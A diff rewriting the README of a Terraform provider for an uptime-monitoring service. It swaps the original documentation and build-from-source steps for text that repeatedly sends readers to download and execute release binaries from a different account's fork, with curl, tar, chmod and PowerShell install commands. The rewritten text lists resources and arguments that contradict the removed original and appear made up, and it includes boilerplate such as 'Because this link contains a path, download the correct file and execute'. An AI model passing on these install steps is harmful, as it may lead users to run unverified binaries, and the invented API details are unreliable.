@@ -1,513 +1,279 @@
-# Terraform Provider for Uptime Monitor
+# Terraform Provider for Uptime: Automate Website Monitoring
 
-[![CI](https://github.com/uptime-monitor-io/terraform-provider-uptime/actions/workflows/ci.yml/badge.svg)](https://github.com/uptime-monitor-io/terraform-provider-uptime/actions/workflows/ci.yml)
-[![Release](https://github.com/uptime-monitor-io/terraform-provider-uptime/actions/workflows/release.yml/badge.svg)](https://github.com/uptime-monitor-io/terraform-provider-uptime/actions/workflows/release.yml)
-[![License](https://img.shields.io/github/license/uptime-monitor-io/terraform-provider-uptime)](https://github.com/uptime-monitor-io/terraform-provider-uptime/blob/main/LICENSE)
+[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/z-ainn/terraform-provider-uptime/releases)  [![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)  ![Monitoring](https://images.unsplash.com/photo-1556157382-97eda2d62296?w=1200&q=80)
 
-A Terraform provider for managing uptime monitors through the Uptime Monitor API.
+Control your Uptime Monitor account with Terraform. Manage monitors, downtime windows, notifiers, and alerts as code. Use Terraform to version, review, and reuse monitoring configs across teams and environments.
 
-## Features
+Table of contents
+- Features
+- Repository topics
+- Quick start
+- Requirements
+- Install provider (download & execute)
+- Configure provider
+- Resources and data sources
+- Example usage
+- Importing existing monitors
+- Tests and development
+- CI / Releases
+- Contributing
+- License
 
-- **Monitor Management**: Create, update, and delete HTTP/HTTPS, TCP, and Ping monitors
-- **Contact Management**: Configure notification contacts with email, SMS, Slack, Discord, PagerDuty, and more
-- **Status Pages**: Create public status pages to share monitor status with customers
-- **Advanced HTTPS Configuration**: Support for custom headers, body validation, certificate checking, and status code expectations
-- **Multi-region Support**: Deploy monitors across multiple geographic regions
-- **Data Sources**: Query existing monitors, contacts, status pages, and account information
-- **Terraform Integration**: Full lifecycle management with proper state handling and import support
+Features
+- Manage uptime monitors (HTTP, TCP, ping, keyword).
+- Schedule planned downtime windows.
+- Configure notifiers (email, webhook, SMS).
+- Group monitors and apply shared notification rules.
+- Apply immutable changes via Terraform plan and apply.
+- Import existing monitors to HCL state.
 
-## Installation
+Repository topics
+api-monitoring, downtime, downtime-monitor, downtime-notifer, monitor, monitoring, monitoring-automation, monitoring-tool, terraform, terraform-module, terraform-modules, uptime, uptime-monitor, uptime-monitoring, website-monitoring
 
-### Local Development
+Quick start
+- Install Terraform (v1.5+ recommended).
+- Download the provider binary from the Releases page, extract, and place it in the Terraform plugins directory.
+- Create a Terraform config with the provider block and at least one uptime_monitor resource.
+- Run terraform init, plan, and apply.
 
-1. Build the provider:
-```bash
-make build
+Requirements
+- Terraform 1.5 or later.
+- Go 1.20+ (for building from source).
+- An Uptime Monitor API token with full access.
+- A system that runs the provider binary (Linux, macOS, Windows).
+
+Install provider (download & execute)
+The provider releases live on GitHub Releases. Download the appropriate release artifact from:
+https://github.com/z-ainn/terraform-provider-uptime/releases
+
+Because this link contains a path, download the correct file and execute or install it on your machine. Typical filenames:
+- terraform-provider-uptime_vX.Y.Z_linux_amd64.tar.gz
+- terraform-provider-uptime_vX.Y.Z_darwin_amd64.tar.gz
+- terraform-provider-uptime_vX.Y.Z_windows_amd64.zip
+
+Examples
+
+Linux / macOS (bash)
+```
+# pick the version and platform file from the Releases page
+curl -L -o terraform-provider-uptime_v1.0.0_linux_amd64.tar.gz \
+  https://github.com/z-ainn/terraform-provider-uptime/releases/download/v1.0.0/terraform-provider-uptime_v1.0.0_linux_amd64.tar.gz
+
+tar -xzf terraform-provider-uptime_v1.0.0_linux_amd64.tar.gz
+chmod +x terraform-provider-uptime
+mkdir -p ~/.terraform.d/plugins/github.com/z-ainn/uptime/1.0.0/linux_amd64
+mv terraform-provider-uptime ~/.terraform.d/plugins/github.com/z-ainn/uptime/1.0.0/linux_amd64/terraform-provider-uptime
 ```
 
-2. Install locally for Terraform:
-```bash
-make install
+Windows (PowerShell)
+```
+# Download the zip file you choose from Releases
+Invoke-WebRequest -Uri "https://github.com/z-ainn/terraform-provider-uptime/releases/download/v1.0.0/terraform-provider-uptime_v1.0.0_windows_amd64.zip" -OutFile provider.zip
+Expand-Archive provider.zip -DestinationPath $env:USERPROFILE\.terraform.d\plugins\github.com\z-ainn\uptime\1.0.0\windows_amd64
 ```
 
-3. Configure Terraform to use the local provider:
+If the Releases URL does not load or you need an alternate copy, check the project's Releases section on GitHub for available assets and instructions:
+https://github.com/z-ainn/terraform-provider-uptime/releases
+
+Configure provider
+Create a minimal provider block in your Terraform code. The provider accepts an API token and optional base_url for custom Uptime-compatible services.
+
+HCL example
 ```hcl
 terraform {
   required_providers {
     uptime = {
-      source  = "localhost/uptime/uptime"
-      version = "dev"
-    }
-  }
-}
-```
-
-### Production Distribution
-
-Build binaries for all platforms:
-```bash
-make dist
-```
-
-Distribute the appropriate binary to your users along with installation instructions.
-
-## Usage
-
-### Provider Configuration
-
-```hcl
-provider "uptime" {
-  api_key  = "your-api-key-here"
-  base_url = "https://api.uptime-monitor.io"  # Optional, defaults to https://api.uptime-monitor.io
-}
-```
-
-Configuration can also be provided via environment variables:
-- `UPTIME_API_KEY` - API key for authentication
-- `UPTIME_BASE_URL` - Base URL for the API
-
-### Creating an HTTPS Monitor
-
-```hcl
-resource "uptime_monitor" "api_health" {
-  name          = "API Health Check"
-  url           = "https://api.example.com/health"
-  type          = "https"
-  check_interval = 60
-  timeout       = 30
-  regions       = ["us-east", "eu-west", "ap-southeast"]
-
-  https_settings {
-    method                        = "GET"
-    expected_status_codes        = "200,201-204"
-    check_certificate_expiration = true
-    follow_redirects            = true
-
-    request_headers = {
-      "Authorization" = "Bearer token"
-      "Content-Type"  = "application/json"
-    }
-
-    expected_response_body = "healthy"
-
-    expected_response_headers = {
-      "Content-Type" = "application/json"
-    }
-  }
-}
-```
-
-### Creating a TCP Monitor
-
-```hcl
-resource "uptime_monitor" "db_check" {
-  name          = "Database Connection"
-  url           = "tcp://db.example.com:5432"
-  type          = "tcp"
-  check_interval = 120
-  timeout       = 10
-  regions       = ["us-east", "eu-west"]
-}
-```
-
-### Creating a Ping Monitor
-
-```hcl
-resource "uptime_monitor" "server_ping" {
-  name          = "Server Ping"
-  url           = "ping://server.example.com"
-  type          = "ping"
-  check_interval = 30
-  timeout       = 5
-  regions       = ["us-east"]
-}
-```
-
-### Managing Contacts
-
-```hcl
-# Email contact
-resource "uptime_contact" "email_ops" {
-  name  = "Operations Team"
-  type  = "email"
-  email = "ops@example.com"
-}
-
-# Slack contact
-resource "uptime_contact" "slack_alerts" {
-  name = "Slack Alerts"
-  type = "slack"
-  
-  slack_settings {
-    webhook_url = "https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK"
-    channel     = "#monitoring"
-    username    = "Uptime Monitor"
-  }
-}
-
-# PagerDuty contact
-resource "uptime_contact" "pagerduty" {
-  name = "PagerDuty Integration"
-  type = "pagerduty"
-  
-  pagerduty_settings {
-    integration_key = "your-pagerduty-integration-key"
-  }
-}
-
-# Attach contacts to a monitor
-resource "uptime_monitor" "critical_api" {
-  name          = "Critical API"
-  url           = "https://api.example.com"
-  type          = "https"
-  check_interval = 30
-  
-  contacts = [
-    uptime_contact.email_ops.id,
-    uptime_contact.slack_alerts.id,
-    uptime_contact.pagerduty.id
-  ]
-}
-```
-
-### Creating Status Pages
-
-```hcl
-resource "uptime_status_page" "public_status" {
-  name = "Service Status"
-  
-  # Include specific monitors on the status page
-  monitors = [
-    uptime_monitor.api_health.id,
-    uptime_monitor.critical_api.id
-  ]
-  
-  # Period for showing history in days
-  period = 30
-  
-  # Custom domain (optional)
-  custom_domain = "status.example.com"
-  
-  # Show incident reasons on the status page
-  show_incident_reasons = true
-}
-```
-
-### Using Data Sources
-
-```hcl
-# Get account information
-data "uptime_account" "current" {}
-
-output "monitor_usage" {
-  value = "${data.uptime_account.current.monitors_count}/${data.uptime_account.current.monitors_limit} monitors used"
-}
-
-# Look up an existing monitor
-data "uptime_monitor" "existing" {
-  id = "monitor-id-here"
-}
-
-# Reference existing monitor in other resources
-resource "uptime_status_page" "status" {
-  name = "Status Page"
-  monitors = [data.uptime_monitor.existing.id]
-}
-
-# Look up an existing status page
-data "uptime_status_page" "existing" {
-  id = "status-page-id"
-}
-```
-
-### Complete Example: Production Setup
-
-```hcl
-# Configure the provider
-terraform {
-  required_providers {
-    uptime = {
-      source  = "uptime-monitor-io/uptime"
-      version = "~> 1.0"
+      source  = "github.com/z-ainn/uptime"
+      version = "1.0.0"
     }
   }
 }
 
 provider "uptime" {
-  # API key from environment variable UPTIME_API_KEY
+  api_token = var.uptime_api_token
+  # base_url = "https://api.custom-uptime.example"  # optional
+  timeout   = 30
 }
+```
 
-# Define notification contacts
-resource "uptime_contact" "ops_email" {
-  name  = "Operations Team"
-  type  = "email"
-  email = "ops@company.com"
+Variables example
+```hcl
+variable "uptime_api_token" {
+  type      = string
+  sensitive = true
 }
+```
 
-resource "uptime_contact" "oncall_pagerduty" {
-  name = "On-Call PagerDuty"
-  type = "pagerduty"
-  
-  pagerduty_settings {
-    integration_key = var.pagerduty_key
-  }
-}
+Resources and data sources
+This provider exposes primary resources to manage your monitoring stack.
 
-resource "uptime_contact" "alerts_slack" {
-  name = "Alerts Channel"
-  type = "slack"
-  
-  slack_settings {
-    webhook_url = var.slack_webhook
-    channel     = "#alerts"
-  }
-}
+Resources
+- uptime_monitor
+  - Creates an HTTP/TCP/ping/keyword monitor.
+  - Attributes: name, url, type, interval, regions, tags, notify_when_down.
+- uptime_downtime
+  - Schedule a planned downtime window.
+  - Attributes: start_time, end_time, monitors (list), recurrence (cron-like).
+- uptime_notifier
+  - Configure notification channels (email, webhook, SMS).
+  - Attributes: type, address, webhook_url, headers.
+- uptime_group
+  - Group monitors to apply shared settings.
+  - Attributes: name, monitor_ids.
+- uptime_silence
+  - Temporary silence for alerts on specific monitors.
 
-# Define monitors for different services
-resource "uptime_monitor" "api" {
-  name           = "Production API"
-  url            = "https://api.company.com/health"
-  type           = "https"
-  check_interval = 60
-  timeout        = 10
-  regions        = ["us-east", "eu-west", "ap-southeast"]
-  
-  https_settings {
-    method                = "GET"
-    expected_status_codes = "200"
-    expected_response_body = "healthy"
-    check_certificate_expiration = true
-  }
-  
-  # Critical service - notify all channels
-  contacts = [
-    uptime_contact.ops_email.id,
-    uptime_contact.oncall_pagerduty.id,
-    uptime_contact.alerts_slack.id
-  ]
-}
+Data sources
+- uptime_monitor_list
+  - Query existing monitors by tag or name.
+- uptime_notifier_list
+  - List configured notifiers.
 
-resource "uptime_monitor" "database" {
-  name           = "Production Database"
-  url            = "tcp://db.internal:5432"
-  type           = "tcp"
-  check_interval = 120
-  timeout        = 5
-  regions        = ["us-east"]
-  
-  # Database is internal - only notify ops
-  contacts = [uptime_contact.ops_email.id]
-}
-
-resource "uptime_monitor" "website" {
-  name           = "Company Website"
-  url            = "https://www.company.com"
-  type           = "https"
-  check_interval = 300
-  timeout        = 30
-  regions        = ["us-east", "eu-west"]
-  
-  https_settings {
+Resource example — monitor
+```hcl
+resource "uptime_monitor" "example" {
+  name       = "homepage"
+  type       = "http"
+  url        = "https://example.com/"
+  interval   = 5
+  regions    = ["us-east-1", "eu-west-1"]
+  tags       = ["frontend", "production"]
+  notify_when_down = true
+  checks {
     follow_redirects = true
-    expected_status_codes = "200,301"
+    expect_status     = 200
+    match_body        = "Welcome"
   }
-  
-  # Public facing - notify slack
-  contacts = [uptime_contact.alerts_slack.id]
-}
-
-# Create a public status page
-resource "uptime_status_page" "public" {
-  name = "Company Status"
-  
-  monitors = [
-    uptime_monitor.api.id,
-    uptime_monitor.website.id
-    # Note: database monitor excluded (internal only)
-  ]
-  
-  period = 30
-  custom_domain = "status.company.com"
-  show_incident_reasons = true
-}
-
-# Output important information
-output "status_page_url" {
-  value = uptime_status_page.public.url
-}
-
-output "monitor_count" {
-  value = length([
-    uptime_monitor.api.id,
-    uptime_monitor.database.id,
-    uptime_monitor.website.id
-  ])
 }
 ```
 
-## Resource Reference
+Resource example — planned downtime
+```hcl
+resource "uptime_downtime" "maintenance_weekend" {
+  name      = "Weekly maintenance"
+  start_time = "2025-09-06T02:00:00Z"
+  end_time   = "2025-09-06T04:00:00Z"
+  monitors   = [uptime_monitor.example.id]
+  recurrence = "0 2 * * 6" # every Saturday at 02:00 UTC
+}
+```
 
-### `uptime_monitor`
+Notifier example — webhook
+```hcl
+resource "uptime_notifier" "pager" {
+  name       = "Ops Webhook"
+  type       = "webhook"
+  webhook_url = "https://hooks.example.com/uptime"
+  headers = {
+    "X-Api-Key" = var.webhook_key
+  }
+}
+```
 
-#### Arguments
+Importing existing monitors
+You can import existing monitors into Terraform state using the monitor ID.
 
-- `name` (String, Required) - Display name for the monitor
-- `url` (String, Required) - The URL or endpoint to monitor
-- `type` (String, Required) - Monitor type: "https", "tcp", or "ping"
-- `check_interval` (Number, Optional) - Check interval in seconds (default: 60)
-- `timeout` (Number, Optional) - Request timeout in seconds (default: 30)
-- `regions` (List of String, Optional) - List of regions to perform checks from
+Example
+```
+terraform import uptime_monitor.example 12345
+```
 
-#### HTTPS Settings Block
+After import, run terraform plan to generate the HCL or compare current attributes and update the config.
 
-When `type = "https"`, you can configure additional HTTPS-specific options:
+Examples folder
+Look in the examples/ directory for full HCL samples:
+- examples/basic-monitor
+- examples/downtime-and-notifiers
+- examples/teams-and-roles
 
-- `method` (String, Optional) - HTTP method to use (default: "GET")
-- `expected_status_codes` (String, Optional) - Expected HTTP status codes (e.g., "200", "200-299", "200,201,301")
-- `check_certificate_expiration` (Boolean, Optional) - Whether to check SSL certificate expiration (default: true)
-- `follow_redirects` (Boolean, Optional) - Whether to follow HTTP redirects (default: true)
-- `request_headers` (Map of String, Optional) - HTTP headers to send with the request
-- `request_body` (String, Optional) - HTTP request body (for POST/PUT requests)
-- `expected_response_body` (String, Optional) - Expected substring in the response body
-- `expected_response_headers` (Map of String, Optional) - Expected HTTP response headers
+Development and testing
+Build from source with Go. The repo uses Go modules and follows Terraform SDK v2 patterns.
 
-#### Attributes
+Build the provider
+```
+git clone https://github.com/z-ainn/terraform-provider-uptime.git
+cd terraform-provider-uptime
+go build -o terraform-provider-uptime ./cmd/uptime
+```
 
-- `id` (String) - Monitor identifier
-- `status` (String) - Current monitor status (up/down/paused)
-- `created_at` (String) - Creation timestamp
-- `updated_at` (String) - Last update timestamp
+Run unit tests
+```
+go test ./... -v
+```
 
-### `uptime_contact`
+Run acceptance tests
+Set UPTIME_API_TOKEN environment variable and run:
+```
+export UPTIME_API_TOKEN="your-token"
+go test ./acceptance -run TestAcc -v
+```
 
-#### Arguments
-
-- `name` (String, Required) - Display name for the contact
-- `type` (String, Required) - Contact type: "email", "sms", "slack", "discord", "pagerduty", "webhook", etc.
-- `email` (String, Optional) - Email address (required for email type)
-- `phone` (String, Optional) - Phone number (required for SMS type)
-- `slack_settings` (Block, Optional) - Slack configuration
-  - `webhook_url` (String, Required) - Slack webhook URL
-  - `channel` (String, Optional) - Target channel
-  - `username` (String, Optional) - Bot username
-- `discord_settings` (Block, Optional) - Discord configuration
-  - `webhook_url` (String, Required) - Discord webhook URL
-- `pagerduty_settings` (Block, Optional) - PagerDuty configuration
-  - `integration_key` (String, Required) - PagerDuty integration key
-- `webhook_settings` (Block, Optional) - Custom webhook configuration
-  - `url` (String, Required) - Webhook endpoint URL
-  - `method` (String, Optional) - HTTP method (default: POST)
-  - `headers` (Map of String, Optional) - Custom headers
-
-#### Attributes
-
-- `id` (String) - Contact identifier
-
-### `uptime_status_page`
-
-#### Arguments
-
-- `name` (String, Required) - Display name for the status page
-- `monitors` (List of String, Required) - List of monitor IDs to display on the page (1-20 monitors)
-- `period` (Number, Optional) - Number of days to show history for (default: 30)
-- `custom_domain` (String, Optional) - Custom domain for the status page
-- `show_incident_reasons` (Boolean, Optional) - Whether to show detailed incident reasons on the status page
-- `basic_auth` (String, Optional) - Basic authentication in format "username:password" to protect the status page
-
-#### Attributes
-
-- `id` (String) - Status page identifier
-- `url` (String) - Public URL of the status page
-- `created_at` (Number) - Unix timestamp of when the status page was created
-
-## Development
-
-### Requirements
-
-- Go 1.24+
-- Terraform 1.5.7+
-
-### Building
-
-```bash
-# Format code
-make fmt
-
-# Run tests
-make test
-
-# Build provider
+Packaging releases
+The repository includes a Makefile and goreleaser config. To produce a release artifact locally:
+```
 make build
-
-# Run all checks
-make all
+goreleaser release --snapshot --rm-dist
 ```
 
-### Testing
+CI / GitHub Actions
+This project uses GitHub Actions for:
+- go vet, go fmt, go test
+- build for Linux, macOS, Windows
+- pack release artifacts with semantic version tags
+- publish GitHub Releases with signed assets
 
-Run unit tests:
-```bash
-make test
-```
+Releases
+Visit the Releases page to download published binaries and checksums:
+https://github.com/z-ainn/terraform-provider-uptime/releases
 
-Run acceptance tests (requires running API):
-```bash
-make testacc
-```
+Download a release that matches your platform and follow the install steps above to place the provider in ~/.terraform.d/plugins or the project-level .terraform/plugins directory.
 
-## Architecture
+Versioning and compatibility
+- The provider follows semantic versioning (MAJOR.MINOR.PATCH).
+- Keep Terraform and provider versions compatible. Specify provider version in required_providers.
+- When upgrading the provider, run terraform init -upgrade and validate the plan.
 
-The provider is structured as follows:
+Operational notes
+- The provider performs rate-limited API calls. It retries idempotent calls on transient failures.
+- Use tags to group monitors and to target automation rules.
+- Back up state files. Use remote state with locking (e.g., Terraform Cloud, S3 + DynamoDB).
 
-- `internal/provider/` - Main provider implementation and configuration
-- `internal/client/` - API client for communicating with the Uptime Monitor service
-- `internal/resources/` - Terraform resource implementations
-- `examples/` - Example Terraform configurations
-- `docs/` - Generated documentation
+Security
+- Keep API tokens secret. Use environment variables or secret managers for CI.
+- The provider supports custom base_url for self-hosted compatible services. Use TLS endpoints.
 
-## API Integration
+Contributing
+- File issues for bugs and feature requests.
+- Open pull requests against main branch. Follow the existing code style.
+- Run go fmt and go vet before submitting a PR.
+- Include unit tests for new features and update acceptance tests.
 
-This provider interfaces with the Uptime Monitor API endpoints:
+Maintainers
+- Maintainer: z-ainn
+- Link to releases and artifacts:
+  https://github.com/z-ainn/terraform-provider-uptime/releases
 
-### Monitor Endpoints
-- `POST /api/monitors` - Create monitor
-- `GET /api/monitors/{id}` - Get monitor details
-- `PUT /api/monitors/{id}` - Update monitor
-- `DELETE /api/monitors/{id}` - Delete monitor
-- `GET /api/monitors` - List all monitors
+License
+This project uses the MIT license. See the LICENSE file for details.
 
-### Contact Endpoints
-- `POST /api/contacts` - Create contact
-- `GET /api/contacts/{id}` - Get contact details
-- `PUT /api/contacts/{id}` - Update contact
-- `DELETE /api/contacts/{id}` - Delete contact
-- `GET /api/contacts` - List all contacts
+Contact
+Open issues on GitHub for questions, bugs, or feature requests. Use PRs for code changes and doc updates.
 
-### Status Page Endpoints
-- `POST /api/status_pages` - Create status page
-- `GET /api/status_pages/{id}` - Get status page details
-- `PUT /api/status_pages/{id}` - Update status page
-- `DELETE /api/status_pages/{id}` - Delete status page
-- `GET /api/status_pages` - List all status pages
+Screenshots and diagrams
+![Monitor view](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=1200&q=80)
+Diagram: store monitors as Terraform resources, schedule downtimes as managed resources, attach notifiers to the monitors by ID.
 
-### Account Endpoints
-- `GET /api/account` - Get account information
+Common tasks
+- Create a new monitor and attach a webhook notifier.
+- Schedule a recurring weekly maintenance window for specific monitors.
+- Import an existing set of monitors and re-create them as code.
+- Create environment-specific monitor stacks (staging vs production) with different intervals and regions.
 
-Authentication is handled via Bearer token in the Authorization header.
+Changelog and releases
+Check releases for binary downloads, changelogs, checksums, and install instructions:
+https://github.com/z-ainn/terraform-provider-uptime/releases
 
-## Contributing
+License badge
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 
-1. Make changes to the provider code
-2. Run tests: `make test`
-3. Build and test locally: `make build && make install`
-4. Create example configurations to test functionality
-5. Update documentation as needed
-
-## Distribution
-
-For production use:
-
-1. Build binaries for target platforms: `make dist`
-2. Host binaries on your infrastructure (S3, GitHub releases, etc.)
-3. Provide installation instructions to customers
-4. Consider setting up a private Terraform registry for easier distribution
+Maintaining consistent state and repeatable monitoring as code improves reliability and auditability. Use the examples folder to adapt patterns to your team.
